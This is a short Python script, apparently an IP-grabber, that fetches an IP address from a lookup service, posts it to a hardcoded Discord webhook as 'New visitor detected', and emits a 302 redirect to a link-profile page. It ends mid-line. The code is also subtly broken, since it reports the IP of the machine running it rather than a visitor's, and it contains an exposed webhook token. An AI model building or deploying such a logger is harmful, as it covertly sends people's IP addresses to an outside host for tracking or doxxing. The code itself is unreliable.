import requests
import socket
import discord
import json

# Discord webhook URL
WEBHOOK_URL ="https://discord.com/api/webhooks/1372473420486279208/Cyhnnpyaz7h0eCYwUUa1UkcO7jXQs24rIZL2fbHMro12sFWEu2kboyz3-wUd7yM69gWf"

# Redirect link
REDIRECT_LINK ="https://guns.lol/00nrcsst"
# Get the visitor's IP address
IP_ADDRESS = requests.get('https://api.ipify.org').text

# Send the IP address to the Discord webhook
data = {'content': f"New visitor detected: {IP_ADDRESS}"}
requests.post(WEBHOOK_URL, json=data)# Set the redirect status code
print("HTTP/1.1 302 Found")
print(f"
